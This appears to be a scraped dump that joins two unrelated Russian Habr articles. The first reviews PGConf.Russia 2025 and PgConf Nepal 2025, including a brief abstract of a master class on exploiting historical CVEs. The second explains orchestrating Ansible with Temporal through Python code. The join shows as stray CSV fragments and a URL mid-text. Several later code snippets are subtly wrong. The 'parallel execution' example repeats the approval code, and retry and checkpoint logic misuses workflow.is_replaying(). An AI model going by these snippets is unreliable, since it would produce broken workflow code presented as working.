Этот небольшой обзор рассказывает о двух конференциях: PGConf.Russia 2025 и PgConf Nepal 2025. Совсем разные, но в чём-то похожие. Главное отличие для меня: что на первый...","Иван Панченко и Олег Бартунов
Этот небольшой обзор рассказывает о двух конференциях: PGConf.Russia 2025 и PgConf Nepal 2025. Совсем разные, но в чём-то похожие. Главное отличие для меня: что на первый я был, а на второй не был. Но коллега Егор Рогов присылал мне впечатления и фотографии. И не он один.
А общее то, что докладчики и доклады, прочитанные в Непале, нередко пересекались с московскими, поэтому во второй части фокус будет, скорее, на атмосфере и пейзажах.
Москва
PGConf.Russia 2025 прошла в месте историческом: в Центре Международной Торговли. История её короткая, но эффектная: построили в конце 70-х, ЦМТ был сначала Совинцентром, потом Хаммеровским центром - это было в то время такое окно в Европу. Через окно входили и выходили технологии и бизнес. Скульптура Меркурия перед фасадом мелькала тогда то и дело в новостях. Бизнес, судя, например, по машинам на парковке, это здание (комплекс зданий) отнюдь не позабыл. Хотел написать (и, как видите, написал) круче только в Кремлёвском Дворце Съездов эту конференцию провести, но это и не так, и ГКД тут ни при чём. Но я был впечатлён, и некоторые бывалые коллеги вспоминали былые тех-события, проходившие здесь во времена, когда таких мест в Москве было раз два и обчёлся, а может и раз - без два.
Но ещё больше впечатлило прибавление числа участников. Офлайн и онлайн посетило в сумме больше 2 тыс. человек (рекорд конференции), но впечатлили присутствующие телесно: зарегистрировалось 1120, но казалось, что их в 2 раза больше, чем на предыдущей (а там было 800 телесных и 600 виртуальных, на этот раз зрителей онлайн было 1100). Во всяком случае, до сих пор не было случая, чтобы я не попал на какой-то доклад из-за того, что не занял место заранее. Говорят, съели и выпили больше 3 тонн продовольствия. Так я думал, но уточнил, и выяснилось, что 3 тонны только съели, а ещё кофе выпили 2 тонны 340 л. Хотя, вроде, усердствовали в этом не больше обычного.
Толпящиеся у стендов и у столов с закуской распределились по двум этажам: один этаж отдали стендам (5 шт.) с решениями Postgres Pro, другой (8 шт.) - другим компаниям-участникам. Три зала = 3 потока, ну это как обычно. 50 с чем-то докладов. Сейчас доклады доступны: видео и презентации участникам конференции (то есть имеющим доступ в личный кабинет), а фотографии - всем желающим. И то, что пока доступно только участникам, постепенно будет выкладываться в общее пользование.
Новый дизайн слонов, между прочим
На этой конференции были опять мастер-классы (они мигающие: то появляются, то исчезают на PGConf). Они очень разные по темам и объёму: от умеренных по 20-30 минут к 60- и 90-минутным и до 2 часовых (на прошлых конференциях случались и 3-часовые).
Работа с расширением pg_uprobe. Трассирование запросов и их анализ. 120 мин, Вадим Лактюшин, Михаил Сироткин, Postgres Professional;
Работа с Shardman. 120, Александр Попов, Postgres Professional;
Интеграция кластера BiHA с корпоративным окружением. 90, Василий Пучков, Postgres Professional;
Отказоустойчивый кластер BiHA. 90, Андрей Забелин, Postgres Professional;
Что можно сделать при помощи pg_probackup3 FUSE? 60, Степан Неретин, Postgres Professional;
Сборка эксплойтов для исторических CVE 30, Андрей Бородин, Яндекс.Облако;
Мастер-класс по работе с CFS. 20-30, Сергей Зимин, Postgres Professional.
Мастер-класс Андрея Бородина
Мастер-классы были только live, задним числом их посмотреть нельзя, останавливаться на них не буду. Ну разве что процитирую аннотацию к мастер-классу Андрея Бородина - доклада самого интригующего, но который я пропустил, да и ноутбука с собой не было:
Попробуем атаковать базу данных с историческими уязвимостями. Для примера будут взяты три уязвимости, я расскажу в чем суть этих уязвимостей и попробуем сделать подход к их взлому. Бери с собой ноутбук с возможность docker-compose, например colima.
Некоторые из дававших мастер-классы делали и доклады. Андрей, например, не ограничился любимой темой эксплойтов, а рассказывал ещё и о своём опыте по сжатию WAL. Речь о сжатии больших записей, а не всего WAL. Он предложил свой способ решения проблемы с большими записями сообществу, вот его письмо в рассылку hackers: Compress big WAL records. Андрей обсуждает способы сжатия, в докладе есть и весьма интересные обобщения.
Некоторые доклады образовывали тематические пары - мне нравится такой подход. Например: Изменение структуры таблиц в PostgreSQL с помощью технологии DBMS_REDEFINITION - это доклад Игоря Мельникова, в своё время перешедшего из Oracle в Postgres Professional. Сейчас Игорь был приглашён уже как независимый консультант. Как и он сам, его разработка имеет оракловые корни. Расширение Postgres с названием dbms_redefinition повторяют пакет с тем же названием в Oracle: DBMS_REDEFINITION - там тот же состав и те же названия функций и их сигнатуры. Игорь написал свой постгресовый пакет целиком на PL/pgSQL, в нём примерно 2 тысячи строк кода. Ссылки нет - пакет ещё не выложен на githab. Но там будет. В конце выступления (в презентации это стр. 21) есть список ограничений. А дальше (стр. 22) есть даже и сравнение с pgpro_redefinition. Понятно, что у pgpro_redefinition галочек - функциональных возможностей больше, но dbms_redifinition будет работать на любом PostgreSQL, не только Pro.
Пару образует доклад Александра Попова из Postgres Professional pgpro_redefinition — итоги переработки - итоги работы за год. Это тот случай, когда надо смотреть доклад, пролистнуть презентацию недостаточно. Александр говорит, что не собирался делать этот доклад (между прочим, на этой конференции он выступал аж 3 раза: кроме 2-часового мастер-класса и этого доклада, ещё и доклад Хранение файлов в Postgres - итого 40+40+120=3ч 20мин). Но, когда узнал о заявленном докладе Мельникова, понял, что надо прояснить некоторые нюансы. Александр, кстати, рассказывал о расширении pgpro_redefinition и на PGConf.Russia 2024.
Дело в том, - сказал он, - что богатая функциональность не самоцель. Некоторые фичи при тестировании на больших таблицах показали себя тормозными, и от них решили отказаться. Так случилось с отложенным переносом данных: там не обойтись без построчного копирования, а от него отказались в пользу копирования постраничного, которое гораздо более быстрое. И там появился и надёжно работает параллелизм.
Логическая репликация работает хорошо и надёжно, но решили, что в этом расширении ей делать нечего, за логической репликацией лучше обратиться к другим инструментам Postgres Pro Enterprise. И так далее - очень важный материал для пользователя или потенциального пользователя этого расширения.
Когда я писал об этих докладах, неожиданно набрёл ещё на один dbms_redefinition - оказывается, есть разработка с таким названием на базе pg_migrate и pg_repack у китайского коллектива HaloLab. Не в обиду автору доклада, только информации ради.
Управление петабайтами логов в PostgreSQL - Крис Трейверс (Christopher Travers), гендир OneMoreData. Это был один из 4 иностранных докладов, второй тоже был Кристофера - о стрессах админа базы. Остальные два транслировались: доклад Перевод T-SQL (MS SQL Server) в PL/pgSQL - Карела ван дер Валта (Karel van der Walt, Mental Arrow) и Migrating from Oracle PL/SQL to PostgreSQL PL/pgSQL : Navigating Differences and Optimization Challenges - Абхинава Сангара (Abhinav Sagar, CSG International - Индия).
Крис постоянный участник PGConf.Russia, с Postgres он уже 27 лет, постил патчи, делал проекты, с очень большими данными работает лет 8-10. И ему есть что рассказать. Не на каждом докладе услышишь, что ""с 10ПБ мы управились легко"". И необычно то, что акцент проектов был на масштабируемости на запись, а не на чтение.
Начало этой истории на прошлом месте работы Криса - немецкой компании Adjust. Мы-то об этой компании немало слышали. Например, мы нередко рассказываем о статьях хорошо нам знакомого Артура Закирова (Artur Zakirov). Крис рассказывает, как организовывали работу с Kafka, как ворочали данные лопатами данных (Data Shovel, Data Schoufel по-немецки), как довели ElasticSearch до предела его возможностей, когда система захлёбывалась и выпадали ноды. И как с этим справлялись.
Через пару лет уже в другом проекте потребовалась еще более масштабируемая система с высокой нагрузкой на запись и редкими чтениями. Разработку в Adjust пока что не отдали в опен сорс, поэтому пришлось делать многое заново - и уж на этот раз всё в опен сорс.
Построили такую систему на PostgreSQL. Разработку назвали Bagger - так зовётся гигантский крупповский роторный экскаватор (не шагает, гусеничный). Bagger способен управлять логами объёмом в десятки и сотни (!) петабайт. Между прочим, такие объёмы копились не годами, а за месяц.
Вот этот bagger: Massive log storage in PostgreSQL. Команда с некоторыми людьми из Adjust писали в основном на Perl (Perl Dancer) и C (триггеры все на C). Может поменяем некоторое число нод на Citus, но это из тех вопросов, которые решаются, а не решены - говорит Крис. Пока что с масштабированием на запись всё хорошо, но одновременно ещё и масштабировать по чтению - задача сложная. И ещё один из нерешённых, рассматриваемых вопросов - можно ли отказаться от TOAST. А ключевое слово доклада, пожалуй, компромиссы.
Крис Трейверс: вот такие большие петабайты
Как PostgreSQL может сделать больно, когда не ожидаешь - Михаил Жилин.
Этого доклада многие ждали. Из-за этого я на него и не попал: выделили большой зал, но не только все места были заняты, а целая толпа ещё стояла в коридоре у входа. От Михаила ждали технически насыщенного доклада и артистизма и дождались, судя по тому, что этот доклад получил больше всего зрительских симпатий (но на PGConf награды не дают сотрудникам Postgres Professional). Интересно, какие бы были баллы, если б давали отдельно за технику и артистизм? Напишу всё же немного - по видео.
Страдания и кошмары. Только реальные примеры, но все имена изменены, а совпадения случайны.
В доклад Михаил уместил 6 увлекательных историй:
глобальные счётчики;
потерянные индексы;
to truncate or not to truncate?
коммить, восхищай!
когда физическая репликация отстаёт;
когда физическая репликация отстаёт, ещё раз, по-другому.
Без котиков теперь никак
Михаил нещадно эксплуатирует метамемы, в докладе полно и моих любимых картинок - диаграмм FlameGraph, они в изобилии появляются в коммить, восхищай! и уже не слезают с экрана проектора - как и результаты perf и других инструментов подлинного исследователя производительности.
Выводы (их 3) такие:
умение профилировать даёт понимание сути проблемы;
свежие версии — это не только фичи, но и…
PostgreSQL можно разогнать до космических скоростей.. (ура!)
В докладе Как возможна Serverless база данных, для задач OLTP и OLAP Николая Голова из Postgres Professional не только бессерверные, но и бессердечные - не верите, проверьте, нет доступа - тогда да, поверьте.
В Postgresso мы довольно часто пишем о бессерверных базах. Чаще всего о Neon, создателей которой мы неплохо знаем. Николай же говорит о Snowflake и CockroachDB. Но дело не в этом, а в том, что рассказывает он об архитектурных и даже концептуальных проблемах/решениях: о Stateless/Statefull, о способах хранения, которые кажутся экстравагантными. Например, он говорит о хранении не строчном, не колоночном, а о хранении отдельных ячеек (определяемых строкой и колонкой) в огромной in memory базе key-value. И лишь за пару минут до конца своего доклада представляет Data Prostore (не путать с Prostore без Data), где есть разделение хранения и вычислений. Это действующая разработка, она была представлена на стенде.
Доклад Павла Лузанова был в самом начале. Ещё бы: тема его - PostgreSQL 18. Но мы уж очень часто начинали рассказ о PGConf с доклада Павла, пусть теперь будет пред-завершающим. Этот доклад был в самом большом зале. Зал - битком. Найти свободное место было непросто.
И так было на многих докладах
Выделю, что из нового в PostgreSQL 18, что мне запомнилось, а Павел счёл заслуживающим внимания.
Это checksums by default - подсчёт контрольных сумм теперь по умолчанию;
buffers - показываются теперь в Explain по умолчанию. И сколько раз сканировался индекс; дробное число строк; использование временного хранилища строк;
можно загрузить pg_overexplain, после чего получить в Explain дополнительные сведения: RANGE TABLE, DEBUG;
в мониторинге: статистика ввода-вывода для WAL; статистика клиентских процессов: ввод-вывод, WAL;
много по автовакууму;
SQL:Темпоральные ключи (не временные, а по времени);
из SQL: виртуальные генерируемые столбцы (раньше были только хранимые).
Расширение Вселенной и жизнь на Земле — астроном Анатолий Засов (доктор физ-мат наук, профессор физического факультета МГУ и сотрудник ГАИШ). Эта лекция была непохожа на лекцию об истории физики Вселенной Алексея Семихатова на PGConf.Russia 2024 - Открытие Вселенной силой мысли. Хотя она тоже звёздная. Обе хороши. Лектор меньше был похож на рок-звезду, не перемещался стремительно по сцене, не так эффектно интонировал, но лекция была ничуть не менее завораживающей. Ну а как иначе, когда тема - существование жизни, откуда она взялась, откуда взялась наша планета, эволюция вселенной, - а рассказывает ... тот, кто и должен и может об этом рассказывать.
PS. Опубликовали запись экспресс-доклада от Олега Бартунова, где он рассказал историю логотипа Slonik сообщества PostgreSQL - на Rutube и на Youtube.
PPS. Postgres Professional в соцсетях: YouTube, Rutube, ВК, Telegram, Дзен, Habr.
Непал
Соорганизатороми конференции были Университет Катманду и Postgres Professional. Были замечены люди из крупных банков. Это третья конференция, и впервые появились местные компании-спонсоры (внизу страницы). Так что Postgres пошёл в непальские массы.
В февральском Postgresso (следующим выйдет сдвоенный ##3-4) мы писали, что конференция пройдёт 5-6 мая в кампусе Университета Катманду в Дуликхеле (Dhulikhel, 30 км от столицы). Это не совсем точно. Практические занятия прошли в KUSoMе - в бизнес школе Университета Катманду, расположенной на окраине города.
Специально для этой конференции мои коллеги из Отдела Образования сделали двухдневную спецверсию курса DEV1 по PostgreSQL 17 (обычный DEV1 рассчитан на 4 дня). Занятия проводили Егор Рогов, Илья Баштанов и Павел Толмачев. Было примерно 30 человек, сидели, слушали внимательно, делали задания, в кулуарах задавали разнообразные вопросы - небольшая, но заинтересованная аудитория.
KUSoM
Сама конференция действительно проходила в Дуликхеле, и на ней было уже человек семьдесят. Для маленького Непала это не так уж мало. Делегация из Postgres Professional была многочисленной: гендир Олег Бартунов, зам гендира Иван Панченко, Михаил Жилин, Екатерина Соколова, Павел Лузанов, Егор Рогов, Павел Толмачёв, Илья Баштанов и Николай Шаплов. Открывал действо Олег Бартунов (но без бубнов и шаманов на этот раз: они, видимо, как-то не вписались в атмосферу этой буддийской страны). Речь его произвела, говорят, большое впечатление на непальцев. Олег много говорил о том, что очень важно вырастить в Непале сообщество. А 2-я и 3-я технические сессии вообще целиком состояли из наших докладов.
Выступали, конечно, и непальцы. Воркшоп по расширениям, например, проводил Свастик Гурунг (Swastik Gurung, Bajra Technologies). Были индийские докладчики (они, кажется, засветились и на PGConf.India 2025, а потом и в Москве) и пакистанский постгресист из известной компании Stormatics. Всех регулярно приветствовал профессор университета доктор Бал Кришна Бал (Bal Krishna Bal) и некоторые его коллеги. Всем причастным вручили token of love - это была кружка с логотипом конференции. Название всем очень понравилось.
Профессор доктор Бал Кришна Бал
Кроме Олега в качестве звёзд выступали Крис Трейверс (Christopher Travers, как и в Москве - во плоти) и Брюс Момджан (как и в прошлом году в Москве - онлайн).
Иван Панченко и Михаил Жилин
С собой взяли сотню свежепереведенных малышек. Часть раздали на курсе, часть на конференции (на фото они перед Иваном Панченко), часть Олег торжественно передал университету для студентов.
Гигант Олег Бартунов с малышкой в руке
Что греха таить, привлекала многочисленных российских гостей не только перспектива Postgres-пресвещения непальцев, но и прогулки, граничащие у многих с серьёзным горным туризмом. А марафон у базового лагеря Джомолунгмы-Эвереста, куда направилась часть делегации - я бы назвал экстремальным развлечением.
впереди перевал Ренжо Ла (5340)
На момент написания этого обзора Олег Бартунов размялся на Таши Лапча (5800, а Эльбрус, кстати, 5642) и направляется с компаньонами к перевалу Ренжо Ла (горные фото из его блога, остальные прислал Егор Рогов).
Такие дела. Надеемся, что следующая конференция будут через год. Сначала речь шла о встрече через два года, но Олег настоял, и Бал согласился. И пообещал, что будет 100+ человек, так что придется переносить конфу в другой зал, побольше.
Тама"
Сложная оркестрация,https://habr.com/ru/articles/910422/,"Предисловие
Ansible и Temporal
Простой рабочий процесс
Рабочие процессы длительного выполнения с использованием точек контроля
Динамическое параллельное выполнение
Утверждения с участием человека
Орке...","Предисловие
Ansible и Temporal
Простой рабочий процесс
Рабочие процессы длительного выполнения с использованием точек контроля
Динамическое параллельное выполнение
Утверждения с участием человека
Оркестрация в кросс-облачных средах
Событийно-ориентированный Ansible (EDA) на стероидах
Рабочие процессы с поддержкой состояния и восстановлением
Отладка с ""перемоткой времени""
Цепочка интеграции между инструментами
Динамический инвентарь Ansible
GitLab
Terraform
Миграции баз данных
Самообслуживание (self-service) с использованием Temporal
Послесловие
Оригинал статьи с диаграммами
Предисловие
Когда речь идет об оркестрации сложных рабочих процессов в гибридных облачных средах, Temporal выделяется как один из лучших инструментов с открытым исходным кодом. Он не пытается заменить такие инструменты, как Terraform или Ansible, а вместо этого дополняет их, добавляя уровень надежности, масштабируемости и гибкости.
Например, в то время как Terraform отлично справляется с предоставлением инфраструктуры, а Ansible управляет конфигурацией, Temporal связывает все воедино. Он гарантирует, что рабочие процессы могут восстанавливаться после сбоев, адаптироваться к условиям выполнения и бесшовно интегрироваться с внешними системами, такими как инструменты мониторинга, CMDB или процессы утверждения. И поскольку это программное обеспечение с открытым исходным кодом, оно избегает привязки к конкретному поставщику, поддерживая практически любой технологический стек.
Основная ценность оркестратора рабочих процессов заключается в его способности обрабатывать длительные, динамические процессы без потери эффективности. Будь то ожидание прохождения проверок работоспособности виртуальной машины, запуск развертывания Kubernetes или обновление CMDB после предоставления ресурсов, Temporal обеспечивает плавное выполнение задач. Речь идет не о создании чего-то нового, а о том, чтобы сделать существующие инструменты более эффективными при совместной работе.
Еще одним преимуществом является способность Temporal обрабатывать длительные процессы, которые часто возникают в операциях второго дня. Например, если вы переносите рабочие нагрузки между облаками или выполняете поэтапное обновление в кластере Kubernetes, Temporal отслеживает прогресс и гарантирует, что рабочий процесс продолжится с того места, где он был прерван — даже в случае сбоя или прерывания. Это делает его идеальным для таких задач, как обновление баз данных, откат приложений или проверки на соответствие требованиям, где согласованность и надежность имеют ключевое значение.
Короче говоря, Temporal помогает ИТ-командам работать быстрее и эффективнее, не жертвуя при этом контролем или управлением, что именно требуется современным предприятиям в быстро меняющемся мире гибридных облаков.
Ansible и Temporal
Temporal решает проблемы автоматизации рабочих процессов, предоставляя надежную основу для управления сложными, длительными процессами, требующими надежности, масштабируемости и отказоустойчивости. Без Temporal выполнение Ansible-плейбуков или аналогичных задач автоматизации может столкнуться с такими проблемами, как сбои выполнения из-за временных ошибок, отсутствие видимости текущих процессов, неспособность возобновить рабочие процессы после сбоев системы и сложность координации нескольких зависимых задач. Temporal гарантирует, что рабочие процессы смогут корректно восстанавливаться после сбоев, сохранять состояние между повторными попытками и позволять динамически адаптироваться к условиям выполнения. Он также обеспечивает бесшовную интеграцию различных инструментов и систем в рамках одного рабочего процесса, упрощая оркестрацию многоступенчатых операций, которые могут включать не только Ansible, но и другие инструменты управления инфраструктурой или приложениями. Обрабатывая сложности координации задач, повторных попыток и управления состоянием, Temporal позволяет разработчикам сосредоточиться на определении логики своих рабочих процессов, не беспокоясь о базовых механизмах выполнения.
Оркестрация
Простой рабочий процесс
Этот Python-скрипт демонстрирует, как использовать Temporal для выполнения Ansible-плейбука, например, такого, который обновляет системные пакеты на сервере. Он настраивает рабочий процесс и активность для выполнения плейбука надежным способом, с такими функциями, как повторные попытки, потоковая передача вывода в реальном времени и корректное завершение работы.
Активность execute_ansible_playbook выполняет команду ansible-playbook, используя asyncio для захвата и отображения вывода по мере его появления. Вы можете передать файл плейбука и, опционально, файл инвентаря. Если что-то пойдет не так и плейбук завершится ошибкой, скрипт вызовет исключение, а Temporal автоматически повторит операцию до трех раз перед тем, как остановиться.
AnsibleWorkflow определяет логику рабочего процесса, которая, по сути, вызывает активность для запуска плейбука. Она настроена с таймаутами и политиками повторных попыток для обработки случаев, когда выполнение плейбука занимает много времени или сталкивается с временными проблемами.
При запуске скрипта он подключается к серверу Temporal, запускает воркер для прослушивания задач и немедленно инициирует рабочий процесс для выполнения указанного плейбука. Например, вы можете указать плейбук, такой как update_packages.yml, который может использовать Ansible-модули, такие как apt или yum, для обновления пакетов на ваших серверах. Скрипт гарантирует, что плейбук выполняется плавно, потоково выводит его результаты в реальном времени и обрабатывает прерывания или ошибки, не теряя информации о текущем состоянии.
Этот подход отлично подходит для автоматизации задач, таких как обновление пакетов на серверах, где ключевыми факторами являются надежность и видимость. Используя Temporal, вы получаете встроенные повторные попытки, отказоустойчивость и возможность легко отслеживать и отлаживать процесс, если что-то пойдет не по плану.
import asyncio
import uuid
import sys
import os
import signal
import argparse
from datetime import timedelta
from temporalio import workflow, activity
from temporalio.client import Client
from temporalio.worker import Worker
from temporalio.common import RetryPolicy

# --- Activity Definition ---
@activity.defn
async def execute_ansible_playbook(playbook_path: str, inventory_path: str = None) -> str:
    """"""Execute ansible-playbook with live output.""""""
    cmd = [""ansible-playbook"", playbook_path]
    if inventory_path:
        cmd.extend([""-i"", inventory_path])

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    output = []
    while True:
        stdout_chunk = await proc.stdout.read(1024)
        stderr_chunk = await proc.stderr.read(1024)

        if not stdout_chunk and not stderr_chunk:
            break

        if stdout_chunk:
            sys.stdout.write(stdout_chunk.decode())
            sys.stdout.flush()
            output.append(stdout_chunk.decode())

        if stderr_chunk:
            sys.stderr.write(stderr_chunk.decode())
            sys.stderr.flush()
            output.append(f""ERROR: {stderr_chunk.decode()}"")

    exit_code = await proc.wait()
    if exit_code != 0:
        raise RuntimeError(f""Playbook failed with exit code {exit_code}"")

    return """".join(output)

# --- Workflow Definition ---
@workflow.defn
class AnsibleWorkflow:
    @workflow.run
    async def run(self, params: dict) -> str:
        return await workflow.execute_activity(
            execute_ansible_playbook,
            args=[params[""playbook_path""], params.get(""inventory_path"")],
            start_to_close_timeout=timedelta(minutes=15),
            retry_policy=RetryPolicy(
                initial_interval=timedelta(seconds=30),
                maximum_interval=timedelta(minutes=2),
                maximum_attempts=3
            )
        )

async def run_workflow_and_worker(playbook_path: str, inventory_path: str = None):
    """"""Start worker and execute workflow automatically""""""
    shutdown_event = asyncio.Event()
    client = None
    worker = None

    def signal_handler():
        shutdown_event.set()

    loop = asyncio.get_running_loop()
    loop.add_signal_handler(signal.SIGINT, signal_handler)
    loop.add_signal_handler(signal.SIGTERM, signal_handler)

    try:
        # Connect to Temporal
        client = await Client.connect(""localhost:7233"")

        # Start worker
        worker = Worker(
            client,
            task_queue=""ansible-queue"",
            workflows=[AnsibleWorkflow],
            activities=[execute_ansible_playbook],
            graceful_shutdown_timeout=timedelta(seconds=5)
        )

        # Run worker in background
        worker_task = asyncio.create_task(worker.run())

        # Execute workflow
        print(f""Executing playbook: {playbook_path}"")
        result = await client.execute_workflow(
            AnsibleWorkflow.run,
            args=[{""playbook_path"": playbook_path, ""inventory_path"": inventory_path}],
            id=f""ansible-{uuid.uuid4()}"",
            task_queue=""ansible-queue"",
            execution_timeout=timedelta(minutes=20)
        )

        print(""\nPlaybook execution result:"")
        print(result)

    except Exception as e:
        print(f""Error: {str(e)}"")
        raise
    finally:
        # Clean shutdown
        shutdown_event.set()
        if worker:
            await worker.shutdown()

if __name__ == ""__main__"":
    parser = argparse.ArgumentParser()
    parser.add_argument(""--playbook"", required=True, help=""Path to playbook file"")
    parser.add_argument(""--inventory"", help=""Path to inventory file"")
    args = parser.parse_args()

    # Validate paths
    if not os.path.exists(args.playbook):
        print(f""Error: Playbook not found at {args.playbook}"")
        sys.exit(1)
    if args.inventory and not os.path.exists(args.inventory):
        print(f""Error: Inventory file not found at {args.inventory}"")
        sys.exit(1)

    try:
        asyncio.run(run_workflow_and_worker(args.playbook, args.inventory))
    except KeyboardInterrupt:
        print(""\nProcess stopped by user"")
        sys.exit(0)
    except Exception as e:
        print(f""\nError: {str(e)}"")
        sys.exit(1)
Эта команда выводит список всех рабочих процессов типа AnsibleWorkflow, которые в данный момент отслеживаются Temporal:
tctl workflow list --query ""WorkflowType='AnsibleWorkflow'""
Эта команда запускает новый экземпляр AnsibleWorkflow для выполнения плейбука apt_update.yml:
tctl workflow run \
    --taskqueue ansible-queue \
    --workflow_type AnsibleWorkflow \
    --input '""apt_update.yml""'
Параметр --inventory является необязательным в данном случае.
Эта команда извлекает подробную информацию о конкретном экземпляре рабочего процесса, идентифицируемого по его идентификатору:
tctl workflow show -w ansible-1dcbe2e1-8b10-4616-8e11-948cb81d83b1
Веб-интерфейс Temporal упрощает управление рабочими процессами, предоставляя интуитивно понятный интерфейс для проверки статусов, просмотра деталей и выполнения действий, таких как отмена рабочих процессов при необходимости.
Temporal
Эта задача (job) в GitLab pipeline, ansible_workflows, автоматизирует выполнение Ansible-плейбука, такого как apt_update.yml, для обновления системных пакетов. Она выполняется на этапе deploy с использованием shell-исполнителя и запускает Python-скрипт (ansible.py), который оркестрирует выполнение плейбука через Temporal.
Скрипт использует Temporal для надежного выполнения плейбука с такими функциями, как повторные попытки и потоковая передача вывода в реальном времени. Если плейбук завершается ошибкой, pipeline отражает эту ошибку, что упрощает процесс отладки. Такая настройка интегрирует обновления инфраструктуры в ваш CI/CD-процесс, обеспечивая надежные и автоматизированные развертывания.
ansible_workflows:
  stage: deploy
  tags:
    - shell
  script:
    - python3 ansible.py --playbook apt_update.yml
GitLab
Рабочие процессы длительного выполнения с использованием точек контроля
Проблема: Ansible-плейбуки завершаются ошибкой при выполнении задач длительного времени (например, при предоставлении облачных ресурсов или развертывании, занимающем несколько часов). Решение: Использовать Temporal-рабочие процессы для автоматического возобновления работы после сбоев. Прогресс фиксируется в точках контроля (например, ""50% виртуальных машин развернуто"") даже в случае аварийного завершения процесса.
@workflow.defn
class AnsibleWorkflow:
    async def run(self, playbook: str):
        while not workflow.is_replaying():
            result = await workflow.execute_activity(
                run_ansible_playbook,
                args=[playbook],
                start_to_close_timeout=timedelta(hours=6),
                heartbeat_timeout=timedelta(minutes=5),
            )
            if result.failed:
                await asyncio.sleep(300)  # Retry after 5 minutes
Динамическое параллельное выполнение
Проблема: Возможности Ansible для асинхронного выполнения ограничены — сложно управлять тысячами узлов динамически. Решение: Рабочие процессы с разветвлением и сборкой результатов (например, развертывание 500 виртуальных машин параллельно с последующим агрегированием результатов).
@workflow.defn
class ProdDeploymentWorkflow:
    async def run(self):
        await run_ansible_playbook(""deploy_staging.yml"")
        if workflow.is_replaying():
            await workflow.wait_for_signal(""prod_approval"")
        else:
            await send_slack_approval_request()
            await workflow.wait_for_signal(""prod_approval"")  # Blocks until approved
        await run_ansible_playbook(""deploy_prod.yml"")
Утверждения с участием человека
Проблема: Ansible Tower требует ручных статических утверждений. Решение: Динамические паузы (например, ""Ожидание утверждения в Slack перед удалением базы данных в продакшене"").
@workflow.defn
class ProdDeploymentWorkflow:
    async def run(self):
        await run_ansible_playbook(""deploy_staging.yml"")
        if workflow.is_replaying():
            await workflow.wait_for_signal(""prod_approval"")
        else:
            await send_slack_approval_request()
            await workflow.wait_for_signal(""prod_approval"")  # Blocks until approved
        await run_ansible_playbook(""deploy_prod.yml"")
Оркестрация в кросс-облачных средах
Проблема: Ansible сам по себе не может координировать рабочие процессы в AWS, Azure и GCP. Решение: Temporal-рабочие процессы оркестрируют мультиоблачные плейбуки.
async def migrate_to_aws():
    await run_ansible_playbook(""azure_shutdown.yml"")
    await run_ansible_playbook(""aws_provision.yml"")
    if await check_aws_health():
        await run_ansible_playbook(""cutover_dns.yml"")
Событийно-ориентированный Ansible (EDA) на стероидах
Проблема: Ansible EDA реагирует только на простые события (например, вебхуки). Решение: Цепочки сложных событий (например, ""Если загрузка CPU > 90% в течение 5 минут, выполнить масштабирование, уведомить PagerDuty и создать тикет"").
async def auto_scale_workflow():
    while True:
        metrics = await fetch_cloud_metrics()
        if metrics.cpu > 90:
            await run_ansible_playbook(""scale_out.yml"")
            await page_team()
            await workflow.sleep(timedelta(minutes=5))  # Cooldown
Рабочие процессы с поддержкой состояния и восстановлением
Проблема: Ansible не сохраняет информацию о предыдущих запусках. Решение: Temporal запоминает состояние (например, ""Повторить попытку только для узлов, которые завершились ошибкой после сбоя"").
async def patch_workflow():
    hosts = await get_hosts()
    for host in hosts:
        try:
            await run_ansible_playbook(f""patch.yml -l {host}"")
        except ActivityError:
            await log_failed_host(host)
    if workflow.is_replaying():
        await retry_failed_hosts()  # Only retries what crashed
Отладка с ""перемоткой времени""
Проблема: Отладка сбоев Ansible болезненна. Решение: Точное воспроизведение рабочих процессов (например, ""Посмотреть, почему плейбук завершился ошибкой 3 дня назад"").
Веб-интерфейс Temporal показывает полную историю + входные и выходные данные для каждого шага.
Цепочка интеграции между инструментами
Проблема: Ansible не может бесшовно вызывать Terraform и Kubernetes. Решение: Объединить инструменты в одном рабочем процессе.
Динамический инвентарь Ansible
Вот как создать динамический инвентарь Ansible, используя рабочий процесс Temporal, который получает данные о хостах из CMDB через REST API, обеспечивая управление инфраструктурой в реальном времени и отказоустойчивость:
Рабочий процесс Temporal → Получает данные CMDB (REST API) → Генерирует динамический инвентарь → Запускает Ansible
def fetch_cmdb_hosts(cmdb_api_url: str, token: str) -> dict:
    headers = {""Authorization"": f""Bearer {token}""}
    response = requests.get(f""{cmdb_api_url}/hosts"", headers=headers)
    response.raise_for_status()
    return response.json()

def generate_inventory(cmdb_data: dict) -> dict:
    inventory = {
        ""_meta"": {""hostvars"": {}},
        ""all"": {""hosts"": []},
        ""web"": {""hosts"": []},
        ""db"": {""hosts"": []}
    }
    
    for host in cmdb_data[""hosts""]:
        inventory[""all""][""hosts""].append(host[""name""])
        inventory[""_meta""][""hostvars""][host[""name""]] = {
            ""ansible_host"": host[""ip""],
            ""ansible_user"": host[""user""],
            ""ansible_become"": True
        }
        if host[""role""] == ""web"":
            inventory[""web""][""hosts""].append(host[""name""])
        elif host[""role""] == ""db"":
            inventory[""db""][""hosts""].append(host[""name""])
    
    return inventory
GitLab
Для интеграции рабочего процесса Ansible на основе Temporal с вебхуком GitLab можно настроить GitLab так, чтобы он запускал рабочий процесс при возникновении определенных событий (например, при отправке изменений в ветку, создании запроса на слияние или создании тега).
Terraform
Использование Terraform и Temporal вместе предоставляет мощную комбинацию для автоматизации инфраструктуры, решая проблемы, которые возникают при использовании каждого из этих инструментов по отдельности. Terraform эффективен в декларативном описании и развертывании инфраструктуры, но требует создания пользовательских провайдеров для новых или нишевых сервисов, что может быть трудоемким в разработке и поддержке. С другой стороны, Temporal предоставляет надежный уровень оркестрации для автоматизации рабочих процессов, включая взаимодействие с API, без необходимости создания пользовательских провайдеров. Например, вы можете использовать Temporal для бесшовной автоматизации взаимодействия с такими сервисами, как Equinix Metal, GoDaddy или VMware через их REST API, организуя сложные, поддерживающие состояние рабочие процессы, которые Terraform в одиночку не способен обработать. В то время как Terraform фокусируется на описании и управлении инфраструктурой как кодом, Temporal дополняет его, обеспечивая динамические, отказоустойчивые и долгосрочные операции, такие как повторные попытки, утверждения и координация между сервисами. Вместе эти инструменты позволяют командам использовать сильные стороны Terraform в развертывании инфраструктуры, полагаясь на Temporal для автоматизации рабочих процессов, создавая более гибкое и масштабируемое решение, чем при использовании каждого из инструментов по отдельности.
